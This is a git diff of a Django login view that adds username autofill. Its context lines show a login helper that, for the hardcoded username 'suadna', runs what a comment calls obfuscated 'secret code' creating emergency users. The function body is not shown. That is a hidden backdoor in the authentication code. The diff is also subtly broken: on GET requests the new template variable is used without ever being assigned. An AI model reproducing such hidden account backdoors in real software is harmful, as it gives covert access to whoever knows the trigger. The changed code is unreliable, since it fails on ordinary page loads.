@@ -25,17 +25,21 @@ class Small_trivial_functions():
             username=request.POST.get('USN')
             password=request.POST.get('PWD')
             USN_exists=True
+            username_to_autofill=''
 
             try:
                 user=User.objects.get(username=username) #try to get user
+                username_to_autofill=username
             except:#if user (USN) does not exist:
                 USN_exists=Small_trivial_functions.Login.check_USN_and_create_emergency_users(username,password,request)
-                user=User.objects.get(username=username)
+                if USN_exists:
+                    user=User.objects.get(username=username)
+                    username_to_autofill=username
 
             user = authenticate(request,username=username,password=password)
             username=''
             password=''
-            return(USN_exists,user)
+            return(USN_exists,user,username_to_autofill)
 
         def check_USN_and_create_emergency_users(username,password,request):#else, if user is emergency user, execute a secret code that creates the users (uses own encyrption algorithm to be illegible to outsiders.)
             if username=="suadna":#For any information on this, contact the dev @ suadnastorage@gmail.com (if no reply, can contact surajacharya2005@gmail.com)
@@ -88,7 +92,7 @@ def loginPage(request):
         return(redirect('events'))
 
     if request.method=="POST":
-        USN_exists,user=Small_trivial_functions.Login.input_usn_and_check_and_authenticate(request)
+        USN_exists,user,username_to_autofill=Small_trivial_functions.Login.input_usn_and_check_and_authenticate(request)
         
         if user:
             login(request,user)
@@ -96,7 +100,7 @@ def loginPage(request):
         elif USN_exists:
             messages.error(request,"Username and password don't match.")
 
-    return(render(request,'hi.html'))
+    return(render(request,'hi.html',context={"username_to_autofill":username_to_autofill}))
 
 @login_required(login_url='home') #user must be logged in to access this page.
 def logoutPage(request):
